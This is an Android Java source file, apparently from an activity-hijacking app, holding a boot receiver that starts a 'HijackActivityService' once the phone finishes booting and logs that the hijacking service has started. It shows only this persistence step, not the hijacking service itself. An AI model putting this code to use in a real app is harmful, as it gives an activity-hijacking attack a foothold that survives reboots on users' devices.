package singuloid.activityhijackapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver
{
    private static final String TAG = "BootReceiver";

    public BootReceiver()
    {
    }
    @Override
    public void onReceive(Context context, Intent intent)
    {
        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED"))
        {
            Intent serviceIntent = new Intent(context, HijackActivityService.class);
            context.startService(serviceIntent);
            WTF.d(TAG, "the hijacking service has been started ");
        }
    }
}
